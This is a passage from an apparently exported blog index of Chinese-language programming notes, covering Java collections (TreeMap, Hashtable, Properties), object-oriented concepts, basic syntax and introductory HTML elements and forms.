System.out.println(&quot;使用 ceilingEntry(): &quot; + numbers.ceilingEntry(&quot;Fourth&quot;)); // 使用 floor() System.out.println(&quot;\\n使用 floorKey(): &quot; + numbers.floorKey(&quot;Fourth&quot;)); System.out.println(&quot;使用 floorEntry(): &quot; + numbers.floorEntry(&quot;Fourth&quot;)); &#125;&#125;/*3. pollFirstEntry()和pollLastEntry()方法 pollFirstEntry() - 返回并删除与映射的第一个键关联的条目 pollLastEntry() -返回并删除与映射的最后一个键关联的条目*/class Main &#123; public static void main(String[] args) &#123; TreeMap&lt;String, Integer&gt; numbers = new TreeMap&lt;&gt;(); numbers.put(&quot;First&quot;, 1); numbers.put(&quot;Second&quot;, 2); numbers.put(&quot;Third&quot;, 3); System.out.println(&quot;TreeMap: &quot; + numbers); //使用 the pollFirstEntry() 方法 System.out.println(&quot;使用 pollFirstEntry(): &quot; + numbers.pollFirstEntry()); // 使用 the pollLastEntry() 方法 System.out.println(&quot;使用 pollLastEntry(): &quot; + numbers.pollLastEntry()); System.out.println(&quot;更新后的TreeMap: &quot; + numbers); &#125;&#125;/*4. headMap()，tailMap()和subMap()方法headMap(key,booleanValue)headMap()方法返回指定键Key(作为参数传递)之前treemap的所有键/值对。booleanValue参数是可选的。默认值为false。如果booleanValue为true，则该方法还包括指定key的键/值对。*/class Main &#123; public static void main(String[] args) &#123; TreeMap&lt;String, Integer&gt; numbers = new TreeMap&lt;&gt;(); numbers.put(&quot;First&quot;, 1); numbers.put(&quot;Second&quot;, 2); numbers.put(&quot;Third&quot;, 3); numbers.put(&quot;Fourth&quot;, 4); System.out.println(&quot;TreeMap: &quot; + numbers); System.out.println(&quot;\\n使用 headMap() 方法:&quot;); // headMap() 使用默认 booleanValue为false System.out.println(&quot;没有指定布尔值: &quot; + numbers.headMap(&quot;Fourth&quot;)); // headMap()使用指定 booleanValue 为 true System.out.println(&quot;指定布尔值为true: &quot; + numbers.headMap(&quot;Fourth&quot;, true)); &#125;&#125;/*tailMap(key,booleanValue)tailMap()方法从指定键（作为参数传递）开始返回树图的所有键/值对。booleanValue是一个可选的参数。默认值为true。如果booleanValue为false，则该方法不包含指定key的键/值对。*/class Main &#123; public static void main(String[] args) &#123; TreeMap&lt;String, Integer&gt; numbers = new TreeMap&lt;&gt;(); numbers.put(&quot;First&quot;, 1); numbers.put(&quot;Second&quot;, 2); numbers.put(&quot;Third&quot;, 3); numbers.put(&quot;Fourth&quot;, 4); System.out.println(&quot;TreeMap: &quot; + numbers); System.out.println(&quot;\\n使用 tailMap() 方法:&quot;); // tailMap() booleanValue使用默认值true System.out.println(&quot;booleanValue使用默认true: &quot; + numbers.tailMap(&quot;Second&quot;)); // tailMap() booleanValue 使用指定值false System.out.println(&quot;booleanValue使用指定false : &quot; + numbers.tailMap(&quot;Second&quot;, false)); &#125;&#125;/*subMap(k1,bV1,k2,bV2)subMap()方法返回与k1和k2之间的键相关联的所有条目，包括k1的条目。bV1和bV2是可选的布尔参数。 bV1的默认值为true，bV2的默认值为false。如果bV1为false，则该方法返回与k1和k2之间的键关联的所有条目，但不包括k1的条目。如果bV2为true，则该方法返回与k1和k2之间的键关联的所有条目，包括k2的条目。*/class Main &#123; public static void main(String[] args) &#123; TreeMap&lt;String, Integer&gt; numbers = new TreeMap&lt;&gt;(); numbers.put(&quot;First&quot;, 1); numbers.put(&quot;Second&quot;, 2); numbers.put(&quot;Third&quot;, 3); numbers.put(&quot;Fourth&quot;, 4); System.out.println(&quot;TreeMap: &quot; + numbers); System.out.println(&quot;\\n使用 subMap() 方法:&quot;); // tailMap() 使用默认布尔值 System.out.println(&quot;使用默认布尔值: &quot; + numbers.subMap(&quot;Fourth&quot;, &quot;Third&quot;)); // tailMap() 指定布尔值 System.out.println(&quot;指定布尔值: &quot; + numbers.subMap(&quot;Fourth&quot;, false, &quot;Third&quot;, true)); &#125;&#125;/*TreeMap的其他方法clone() 创建TreeMap副本containsKey() 搜索TreeMap指定的键，并返回布尔结果containsValue() 在TreeMap中搜索指定的值并返回布尔结果size() 返回的大小 TreeMapclear() 从中删除所有条目 TreeMap*/ Hashtable12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364/* Hashtable定义了四个构造方法。第一个是默认构造方法：Hashtable()第二个构造函数创建指定大小的哈希表：Hashtable(int size)第三个构造方法创建了一个指定大小的哈希表，并且通过fillRatio指定填充比例。填充比例必须介于0.0和1.0之间，它决定了哈希表在重新调整大小之前的充满程度：Hashtable(int size,float fillRatio)第四个构造方法创建了一个以M中元素为初始化元素的哈希表。哈希表的容量被设置为M的两倍。Hashtable(Map m)*/import java.util.*;public class HashTableDemo &#123; public static void main(String args[]) &#123; // Create a hash map Hashtable balance = new Hashtable(); Enumeration names; String str; double bal; balance.put(&quot;Zara&quot;, new Double(3434.34)); balance.put(&quot;Mahnaz&quot;, new Double(123.22)); balance.put(&quot;Ayan&quot;, new Double(1378.00)); balance.put(&quot;Daisy&quot;, new Double(99.22)); balance.put(&quot;Qadir&quot;, new Double(-19.08)); // Show all balances in hash table. names = balance.keys(); while(names.hasMoreElements()) &#123; str = (String) names.nextElement(); System.out.println(str + &quot;: &quot; + balance.get(str)); &#125; System.out.println(); // Deposit 1,000 into Zara&#x27;s account bal = ((Double)balance.get(&quot;Zara&quot;)).doubleValue(); balance.put(&quot;Zara&quot;, new Double(bal+1000)); System.out.println(&quot;Zara&#x27;s new balance: &quot; + balance.get(&quot;Zara&quot;)); &#125;&#125;/*以上实例编译运行结果如下：Qadir: -19.08Zara: 3434.34Mahnaz: 123.22Daisy: 99.22Ayan: 1378.0Zara&#x27;s new balance: 4434.34*/ Properties123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/* Properties 类定义了两个构造方法。 第一个构造方法没有默认值。Properties()第二个构造方法使用propDefault 作为默认值。两种情况下，属性列表都为空：Properties(Properties propDefault)*/import java.util.*; public class PropDemo &#123; public static void main(String args[]) &#123; Properties capitals = new Properties(); Set states; String str; capitals.put(&quot;Illinois&quot;, &quot;Springfield&quot;); capitals.put(&quot;Missouri&quot;, &quot;Jefferson City&quot;); capitals.put(&quot;Washington&quot;, &quot;Olympia&quot;); capitals.put(&quot;California&quot;, &quot;Sacramento&quot;); capitals.put(&quot;Indiana&quot;, &quot;Indianapolis&quot;); // Show all states and capitals in hashtable. states = capitals.keySet(); // get set-view of keys Iterator itr = states.iterator(); while(itr.hasNext()) &#123; str = (String) itr.next(); System.out.println(&quot;The capital of &quot; + str + &quot; is &quot; + capitals.getProperty(str) + &quot;.&quot;); &#125; System.out.println(); // look for state not in list -- specify default str = capitals.getProperty(&quot;Florida&quot;, &quot;Not Found&quot;); System.out.println(&quot;The capital of Florida is &quot; + str + &quot;.&quot;); &#125;&#125;/*以上实例编译运行结果如下：The capital of Missouri is Jefferson City.The capital of Illinois is Springfield.The capital of Indiana is Indianapolis.The capital of California is Sacramento.The capital of Washington is Olympia.The capital of Florida is Not Found.*/","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"Java","slug":"开发/Java","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"Java面向对象编程","slug":"Java面向对象编程","date":"2023-12-23T05:51:56.465Z","updated":"2023-12-28T04:43:48.054Z","comments":true,"path":"2023/12/23/Java面向对象编程/","permalink":"http://example.com/2023/12/23/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/","excerpt":"","text":"Java面向对象编程类与对象1234567891011121314151617181920212223242526272829303132333435363738394041//Java类及类的成员：属性、方法、构造器、代码块、内部类//面向对象的特征：封装、继承、多态、抽象//其他关键字的使用：this、super、package、import、static、final、interface、abstract等public class phone &#123; //属性 double price; String name; //方法 public void call()&#123; System.out.println(&quot;打电话&quot;); &#125; public void sendMessage(String[] message)&#123; System.out.println(message[1]); &#125; public void playGame(String game)&#123; System.out.println(&quot;玩&quot;+game); &#125;&#125;public class Main &#123; public static void main(String[] args) &#123; //创建对象 phone p1=new phone(); //声明属性 p1.name=&quot;redmi&quot;; p1.price=1999; //声明方法 p1.call(); p1.playGame(&quot;4&quot;); String[] message=&#123;&quot;1&quot;,&quot;2&quot;&#125;; p1.sendMessage(message); &#125;&#125;/*输出：打电话玩42*/ 对象数组1234567891011121314151617181920public class Main &#123; public static void main(String[] args) &#123; //创建对象数组 phone p1[]=new phone[2]; for (int a=0;a&lt;p1.length;a++) &#123; p1[a]=new phone(); &#125; //声明属性 p1[0].name=&quot;redmi&quot;; p1[0].price=1999; p1[1].name=&quot;onplus&quot;; p1[1].price=2499; for(int a=0;a&lt; p1.length;a++) &#123; System.out.println(&quot;品牌：&quot;+p1[a].name+&quot;,价格：&quot;+p1[a].price); &#125; &#125;&#125; 方法的重载1234567891011//在同一个类中，允许存在一个以上的同名方法，只要它们的参数列表不同即可public void playGame(String game)&#123; System.out.println(&quot;玩&quot;+game); &#125; public void playGame(String games,int a) &#123; System.out.println(&quot;玩了&quot;+games+a+&quot;小时&quot;); &#125; 可变个数形参的方法123456789public void sum(int...num)&#123; int sum=0; for(int a=0;a&lt;num.length;a++) &#123; sum=sum+num[a]; &#125; System.out.println(sum);&#125; 递归123public void methoda()&#123; methoda(); &#125; 封装12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/*一种将抽象性函式接口的实现细节部分包装、隐藏起来的方法。封装可以被认为是一个保护屏障，防止该类的代码和数据被外部类定义的代码随机访问 使用private protected public*/public class EncapTest&#123; private String name; private String idNum; private int age; public int getAge()&#123; return age; &#125; public String getName()&#123; return name; &#125; public String getIdNum()&#123; return idNum; &#125; public void setAge( int newAge)&#123; age = newAge; &#125; public void setName(String newName)&#123; name = newName; &#125; public void setIdNum( String newId)&#123; idNum = newId; &#125;&#125;public class RunEncap&#123; public static void main(String args[])&#123; EncapTest encap = new EncapTest(); encap.setName(&quot;James&quot;); encap.setAge(20); encap.setIdNum(&quot;12343ms&quot;); System.out.print(&quot;Name : &quot; + encap.getName()+ &quot; Age : &quot;+ encap.getAge()); &#125;&#125; modifier 本类内 本包内 其他包的子类 其他包的非子类 public y y y y protected y y y n no modifiter y y n n private y n n n 关键字this123456789101112131415161718//class Person &#123; private int age = 10;//a--&gt;private int a public Person()&#123; System.out.println(&quot;初始化年龄：&quot;+age);&#125; public int GetAge(int age)&#123; this.age = age;//this.age--&gt;a return this.age; &#125;&#125; public class test1 &#123; public static void main(String[] args) &#123; Person Harry = new Person(); System.out.println(&quot;Harry&#x27;s age is &quot;+Harry.GetAge(12)); &#125;&#125; 关键字 super123456789101112131415161718192021class Country &#123; String name; void value() &#123; name = &quot;China&quot;; &#125;&#125; class City extends Country &#123; String name; void value() &#123; name = &quot;Shanghai&quot;; super.value(); //调用父类的方法 System.out.println(name); System.out.println(super.name); &#125; public static void main(String[] args) &#123; City c=new City(); c.value(); &#125;&#125; 继承1234567891011121314151617181920212223242526272829//extends//在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。public class Animal &#123; private String name; private int id; public Animal(String myName, int myid) &#123; //初始化属性值 &#125; public void eat() &#123; //吃东西方法的具体实现 &#125; public void sleep() &#123; //睡觉方法的具体实现 &#125; &#125; public class Penguin extends Animal&#123; &#125; //implements/*使用 implements 关键字可以变相的使java具有多继承的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。*/public interface A &#123; public void eat(); public void sleep();&#125; public interface B &#123; public void show();&#125; public class C implements A,B &#123;&#125; final 关键字12//使用 final 关键字声明类，就是把类定义定义为最终类，不能被继承，或者用于修饰方法，该方法不能被子类重写final class 类名 &#123;//类体&#125; 方法的重写1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/*重写是子类对父类的允许访问的方法的实现过程进行重新编写, 返回值和形参都不能改变*/class Animal&#123; public void move()&#123; System.out.println(&quot;动物可以移动&quot;); &#125;&#125; class Dog extends Animal&#123; public void move()&#123; System.out.println(&quot;狗可以跑和走&quot;); &#125;&#125; public class TestDog&#123; public static void main(String args[])&#123; Animal a = new Animal(); // Animal 对象 Animal b = new Dog(); // Dog 对象 a.move();// 执行 Animal 类的方法 b.move();//执行 Dog 类的方法 &#125;&#125;/*编译结果：动物可以移动狗可以跑和走*/class Animal&#123; public void move()&#123; System.out.println(&quot;动物可以移动&quot;); &#125;&#125; class Dog extends Animal&#123; public void move()&#123; System.out.println(&quot;狗可以跑和走&quot;); &#125; public void bark()&#123; System.out.println(&quot;狗可以吠叫&quot;); &#125;&#125; public class TestDog&#123; public static void main(String args[])&#123; Animal a = new Animal(); // Animal 对象 Animal b = new Dog(); // Dog 对象 a.move();// 执行 Animal 类的方法 b.move();//执行 Dog 类的方法 b.bark(); &#125;&#125;/*编译结果：TestDog.java:30: cannot find symbolsymbol : method bark()location: class Animal b.bark(); ^该程序将抛出一个编译错误，因为b的引用类型Animal没有bark方法。*/ 多态12345678910111213141516171819202122//适用于方法，不适用与属性 向上转型abstract class Animal &#123; abstract void eat(); &#125; class Cat extends Animal &#123; public void eat() &#123; System.out.println(&quot;吃鱼&quot;); &#125; public void work() &#123; System.out.println(&quot;抓老鼠&quot;); &#125; &#125;public class Main &#123; public static void main(String[] args) &#123; Animal a=new Cat() &#125; //向下转型 Cat c = (Cat)a //instanceof if (a instanceof Cat) //判断a是否是猫 Object类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677//Java.lang.Object//任何Java类（除Object类）都直接或间接的继承与Object类//Object类称为Java类的根父类//Object clone() 方法用于创建并返回一个对象的拷贝。/*clone 方法是浅拷贝，对象内属性引用的对象只会拷贝引用地址，而不会将引用的对象重新分配内存，相对应的深拷贝则会连引用的对象也新重新创建*/class RunoobTest implements Cloneable &#123; // 声明变量 String name; int likes; public static void main(String[] args) &#123; // 创建对象 RunoobTest obj1 = new RunoobTest(); // 初始化变量 obj1.name = &quot;Runoob&quot;; obj1.likes = 111; // 打印输出 System.out.println(obj1.name); // Runoob System.out.println(obj1.likes); // 111 try &#123; // 创建 obj1 的拷贝 RunoobTest obj2 = (RunoobTest) obj1.clone(); // 使用 obj2 输出变量 System.out.println(obj2.name); // Runoob System.out.println(obj2.likes); // 111 &#125; catch (Exception e) &#123; System.out.println(e); &#125; &#125;&#125;/*以上程序执行结果为：Runoob111Runoob111*///Object finalize() 方法用于实例被垃圾回收器回收的时触发的操作。//当 GC (垃圾回收器) 确定不存在对该对象的有更多引用时，对象的垃圾回收器就会调用这个方法。//语法 protected void finalize()class RunoobTest extends GregorianCalendar &#123; public static void main(String[] args) &#123; try &#123; // 创建 RunoobTest 对象 RunoobTest cal = new RunoobTest(); // 输出当前时间 System.out.println(&quot;&quot; + cal.getTime()); // finalize cal System.out.println(&quot;Finalizing...&quot;); cal.finalize(); System.out.println(&quot;Finalized.&quot;); &#125; catch (Throwable ex) &#123; ex.printStackTrace(); &#125; &#125;&#125;/*以上程序执行结果为：Sun Oct 11 11:36:46 CST 2020Finalizing...Finalized.*/ equals()12345678910111213141516171819202122//equals() 方法用于将字符串与指定的对象比较。//String 类中重写了 equals() 方法用于比较两个字符串的内容是否相等。/*使用 == 和 equals() 比较字符串。String 中 == 比较引用地址是否相同，equals() 比较字符串的内容是否相同：*/String s1 = &quot;Hello&quot;; // String 直接创建String s2 = &quot;Hello&quot;; // String 直接创建String s3 = s1; // 相同引用String s4 = new String(&quot;Hello&quot;); // String 对象创建String s5 = new String(&quot;Hello&quot;); // String 对象创建 s1 == s1; // true, 相同引用s1 == s2; // true, s1 和 s2 都在公共池中，引用相同s1 == s3; // true, s3 与 s1 引用相同s1 == s4; // false, 不同引用地址s4 == s5; // false, 堆中不同引用地址 s1.equals(s3); // true, 相同内容s1.equals(s4); // true, 相同内容s4.equals(s5); // true, 相同内容 toString()1234567891011121314151617181920212223/*toString() 方法用于返回以一个字符串表示的 Number 对象值。如果方法使用了原生的数据类型作为参数，返回原生数据类型的 String 对象值。如果方法有两个参数， 返回用第二个参数指定基数表示的第一个参数的字符串表示形式。语法 String toString() static String toString(int i) i -- 要转换的整数。 toString(): 返回表示 Integer 值的 String 对象。 toString(int i): 返回表示指定 int 的 String 对象。*/public class Test&#123; public static void main(String args[])&#123; Integer x = 5; System.out.println(x.toString()); System.out.println(Integer.toString(12)); &#125;&#125;/*编译以上程序，输出结果为：512*/ static静态12345678910111213//static修饰变量//类中公用static boolean nfc;p1.nfc =true;System.out.println(p1.nfc);//tureSystem.out.println(p2.nfc);//truep2.nfc=false;System.out.println(p1.nfc);//falseSystem.out.println(p1.nfc);//false//static修饰方法//static方法内可以调用static属性和static方法，不可以调用非static//非static可以调用static abstract抽象1234567891011/*1. 抽象类不能被实例化(初学者很容易犯的错)，如果被实例化，就会报错，编译无法通过。只有抽象类的非抽象子类可以创建对象。2. 抽象类中不一定包含抽象方法，但是有抽象方法的类必定是抽象类。3. 抽象类中的抽象方法只是声明，不包含方法体，就是不给出方法的具体实现也就是方法的具体功能。4. 构造方法，类方法（用 static 修饰的方法）不能声明为抽象方法。5. 抽象类的子类必须给出抽象类中的抽象方法的具体实现，除非该子类也是抽象类。*/ 接口123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//属性 必须使用public static final 修饰 不写默认加上//Java 原则上只支持单一继承，但通过接口可以实现多重继承的目的。//ClassC 同时继承了 ClassA 和 ClassB，ClassC 的对象在调用 ClassA 和 ClassB 中重写的方法时，就不知道该调用 ClassA 的方法，还是 ClassB 的方法。//接口没有这方面的困扰。来定义两个接口，Fly 接口会飞，Run 接口会跑。public interface Fly &#123; void fly();&#125;public interface Run &#123; void run();&#125;public class Pig implements Fly,Run&#123; @Override public void fly() &#123; System.out.println(&quot;会飞的猪&quot;); &#125; @Override public void run() &#123; System.out.println(&quot;会跑的猪&quot;); &#125;&#125;//实现多态。public interface Shape &#123; String name();&#125;public class Circle implements Shape &#123; @Override public String name() &#123; return &quot;圆&quot;; &#125;&#125;public class Square implements Shape &#123; @Override public String name() &#123; return &quot;正方形&quot;; &#125;&#125;List&lt;Shape&gt; shapes = new ArrayList&lt;&gt;();Shape circleShape = new Circle();Shape squareShape = new Square();shapes.add(circleShape);shapes.add(squareShape);for (Shape shape : shapes) &#123; System.out.println(shape.name());&#125;//圆//正方形 内部类123456class OuterClass &#123; // 外部类 // ... class NestedClass &#123; // 嵌套类，或称为内部类 // ... &#125;&#125; 枚举类 123public enum Color &#123; RED, GREEN, BLUE;&#125; 注解1234567891011121314@Override - 检查该方法是否是重写方法。如果发现其父类，或者是引用的接口中并没有该方法时，会报编译错误。@Deprecated - 标记过时方法。如果使用该方法，会报编译警告。@SuppressWarnings - 指示编译器去忽略注解中声明的警告。作用在其他注解的注解(或者说 元注解)是:@Retention - 标识这个注解怎么保存，是只在代码中，还是编入class文件中，或者是在运行时可以通过反射访问。@Documented - 标记这些注解是否包含在用户文档中。@Target - 标记这个注解应该是哪种 Java 成员。@Inherited - 标记这个注解是继承于哪个注解类(默认 注解并没有继承于任何子类)从 Java 7 开始，额外添加了 3 个注解:@SafeVarargs - Java 7 开始支持，忽略任何使用参数为泛型变量的方法或构造函数调用产生的警告。@FunctionalInterface - Java 8 开始支持，标识一个匿名函数或函数式接口。@Repeatable - Java 8 开始支持，标识某注解可以在同一个声明上使用多次。","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"Java","slug":"开发/Java","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"Java基本语法","slug":"java基本语法","date":"2023-12-23T05:51:38.220Z","updated":"2023-12-23T09:08:58.151Z","comments":true,"path":"2023/12/23/java基本语法/","permalink":"http://example.com/2023/12/23/java%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/","excerpt":"","text":"Java基本语法注释123单行注释 //多行注释 /* */文档注释 /** */ 变量与运算符关键字的使用123关键字：被Java语言赋予了特殊含义，用做专门用途的字符串 如 class public static void 等都是关键字 关键字都是小写 标识符的使用12345678910111213Java中变量、方法、类等要素命名时使用的字符序列，被称为标识符 凡是自己可以起名字的地方都叫标识符 命名规则 1.字母、数字、_、$组成 2.数字不可以开头 3.不可以使用关键字、保留字，但可以包含关键字、保留字 4.Java中严格区分大小写，长度无限制 5.不能包含空格 命名规范 1.包名 多单词时所有单词都小写 java.lang 2.类名、接口名 多单词时所有单词首字母大写 HelloWorld 3.变量名、方法名 多单词时第一个首字母小写，第二个开始首字母大写 bookName 4.常量名 所有字母大写，多单词时用_连接 MAX_VALUE 变量的使用与数据类型12345678910111213141516171819202122232425262728293031概念：内存中的一个存储区域，该区域的数据可以在同一类型范围内不断变化要素：数据类型、变量名、存储的值格式：数据类型 变量名=变量值 int a=1;使用： 变量先声明后使用数据类型： 整形 byte short int long 需要以1或者L作为后缀 浮点型 float 单精度 需要以f或者F作为后缀 double 双精度 字符型 char 单字符 布尔型 boolean 类 class 数组 array 接口 interface 枚举 enum 注解 annotation 记录 record强制类型转换 float b=(float)a; String类12字符串 StringString str=&#x27;hello&#x27;; 运算符123456算术运算符 + - * / % ++ --赋值运算符 = += -= *= /= %= &gt;&gt;= &lt;&lt;= &gt;&gt;&gt;= &amp;= |= ^=等比较运算符 &gt; &lt; &gt;= &lt;= == !=逻辑运算符 || &amp;&amp; | &amp; ^ ! 位运算符 &amp; | ^ ~ &lt;&lt; &gt;&gt; &gt;&gt;&gt;条件运算符 条件？ 结果1:结果2 if-else123456789if(布尔表达式 1)&#123; //如果布尔表达式 1的值为true执行代码&#125;else if(布尔表达式 2)&#123; //如果布尔表达式 2的值为true执行代码&#125;else if(布尔表达式 3)&#123; //如果布尔表达式 3的值为true执行代码&#125;else &#123; //如果以上布尔表达式都不为true执行代码&#125; Scanner类1234 //Scanner 类可以来获取用户的输入 Scanner scan = new Scanner(System.in);String str1 = scan.next();//空格结束String str2 = scan.nextLine();//回车结束 switch-case1234567891011switch(expression)&#123; case value : //语句 break; //可选 case value : //语句 break; //可选 //你可以有任意数量的case语句 default : //可选 //语句&#125; 循环结构for循环123for(初始化; 布尔表达式; 更新) &#123; //代码语句&#125; while循环123while( 布尔表达式 ) &#123; //循环内容&#125; do-while循环123456//对于 while 语句而言，如果不满足条件，则不能进入循环。但有时候我们需要即使不满足条件，也至少执行一次。do…while 循环和 while 循环相似，不同的是，do…while 循环至少会执行一次。do &#123; //代码语句&#125;while(布尔表达式); 数组一维数组12345678910111213//声明数组 int arr[]; //初始化 arr=new int[]&#123;1,2,3,5,6,9,7&#125;; //调用 System.out.println(arr[6]); //数组长度 System.out.println(arr.length); //For-Each 循环 也可以用其他循环 for(int element: arr) &#123; System.out.println(element); &#125; 多维数组12345678910111213141516//声明数组 int arr[][]; //初始化 arr=new int[][]&#123;&#123;1&#125;,&#123;2,3&#125;,&#123;5,6,9,7&#125;&#125;; //调用 System.out.println(arr[0][0]); //数组长度 System.out.println(arr.length); //For-Each 循环 也可以用其他循环 for(int[] element: arr) &#123; for(int cow:element) &#123; System.out.println(cow); &#125; &#125;","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"Java","slug":"开发/Java","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"前端3剑客","slug":"前端3剑客","date":"2023-12-21T15:17:57.017Z","updated":"2023-12-23T05:22:43.986Z","comments":true,"path":"2023/12/21/前端3剑客/","permalink":"http://example.com/2023/12/21/%E5%89%8D%E7%AB%AF3%E5%89%91%E5%AE%A2/","excerpt":"","text":"前端3剑客HTML标题123&lt;h1&gt;标题h1&lt;/h1&gt;&lt;h2&gt;标题h2&lt;/h2&gt;&lt;!-- h1到h6 --&gt; 段落1234567&lt;p&gt; 亚洲政策研究所 （API） 成立于 2023 年 5 月，是一家位于新泽西州的独立 501（c）（3） 非营利性研究机构。 我们专注于对亚洲面临的问题进行政策研究，应对亚洲各地的关键挑战，为政治家和企业提供政策见解&lt;/p&gt; 我们的核心竞争力在于提供高影响力、高成本效益的社会研究，为政治家和企业提供建议， 为亚洲的政策制定提供适当的方向，以创造亚洲更美好的未来&lt;p&gt; 换行12345678&lt;p&gt; 亚洲政策研究所 （API） 成立于 2023 年 5 月，是一家位于新泽西州的独立 501（c）（3） 非营利性研究机构。&lt;br&gt; 我们专注于对亚洲面临的问题进行政策研究，应对亚洲各地的关键挑战，为政治家和企业提供政策见解&lt;/p&gt; 我们的核心竞争力在于提供高影响力、高成本效益的社会研究，为政治家和企业提供建议，&lt;br&gt; 为亚洲的政策制定提供适当的方向，以创造亚洲更美好的未来&lt;p&gt; &lt;!-- br普通换行，hr换行加线 --&gt; 列表1234567891011121314&lt;!---有序列表 ol无序列表 ul列表项 li--&gt; &lt;ol&gt; &lt;li&gt;ol1&lt;/li&gt; &lt;li&gt;ol2&lt;/li&gt; &lt;/ol&gt; &lt;ul&gt; &lt;li&gt;ul1&lt;/li&gt; &lt;li&gt;ul2&lt;/li&gt; &lt;/ul&gt; 超链接12345678&lt;!--a href 目标的地址 target 打开方式 _self 当前页面 _blank 新页面--&gt;&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_blank&quot;&gt;baidu&lt;/a&gt; 图片12345678&lt;!--img src 图片路径 title 鼠标悬停时提示的文字 alt 加载失败时提示的文字--&gt;&lt;img src=&quot;&quot; alt=&quot;&quot;&gt; 表格1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;!--table 整张表格 boder 加线条 thead 表头 tbody 表体 tfoot 表尾 tr 表格中的一行 td 行中的一个单元格 rowspan 让单元格跨行 colspan 让单元格跨列 th 自带加粗居中效果的td--&gt;&lt;h3 style=&quot;text-align: center;&quot;&gt;员工技能竞赛评分表&lt;/h3&gt; &lt;table border=&quot;1px&quot; style=&quot;margin: 0px auto;&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;排名&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;分数&lt;/th&gt; &lt;th&gt;备注&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt;小明&lt;/td&gt; &lt;td&gt;100&lt;/td&gt; &lt;td rowspan=&quot;4&quot;&gt;前3名加薪&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;2&lt;/td&gt; &lt;td&gt;小白&lt;/td&gt; &lt;td&gt;99&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;3&lt;/td&gt; &lt;td&gt;小黑&lt;/td&gt; &lt;td&gt;98&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;总人数&lt;/td&gt; &lt;td colspan=&quot;2&quot;&gt;200&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;tfoot&gt; &lt;/tfoot&gt; &lt;/table&gt; 表单12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!--form action 数据提交地址 method 提交方式 get/post input type 输入信息类型 text 普通文本框 passowrd 密码框 定义name属性 submit 提交按钮 reset 重置按钮 定义value属性 radio 单选框 多个单选框使用相同name属性，则会有互斥效果 设置value属性提交 设置checked属性默认值 checkbox 复选框 hidde 隐藏域 页面不会显示 可提交 readonly 页面显示但不能修改 可提交 disabled 页面显示但不能修改 不可提交 textarea 文本域 select 下拉框 option 选项 selected 默认值 file 文件上传框--&gt;&lt;form action=&quot;01firstpage.html&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;123&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;pid&quot; value=&quot;4556&quot; readonly&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;tid&quot; value=&quot;789&quot; disabled&gt;&lt;br&gt; 用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt; 密码： &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt; 性别：&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;1&quot; checked=&quot;true&quot;&gt;男 &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;2&quot;&gt;女 &lt;br&gt; 爱好：&lt;input type=&quot;checkbox&quot; value=&quot;1&quot; name=&quot;hobby&quot;&gt;蓝球 &lt;input type=&quot;checkbox&quot; value=&quot;2&quot; name=&quot;hobby&quot;&gt;足球 &lt;input type=&quot;checkbox&quot; value=&quot;3&quot; name=&quot;hobby&quot;&gt;乒乓球&lt;br&gt; 个人简介：&lt;textarea name=&quot;intro&quot; id=&quot;2&quot; cols=&quot;30&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt;&lt;br&gt; 籍贯： &lt;select name=&quot;pro&quot; id=&quot;1&quot;&gt; &lt;option value=&quot;1&quot;&gt;广西&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;广东&lt;/option&gt; &lt;option value=&quot;0&quot; selected&gt;请选择&lt;/option&gt; &lt;/select&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登陆&quot;&gt; &lt;input type=&quot;reset&quot; value=&quot;清空&quot;&gt; &lt;/form&gt; 布局123456789&lt;!--div 相当与盒子 块元素 css样式的宽 高等 往往都是生效的span 行内元素 css样式的宽 高等 往往都是不生效的--&gt;&lt;div style=&quot;border: 1px solid red; width: 500px;height: 200px; margin: 10px 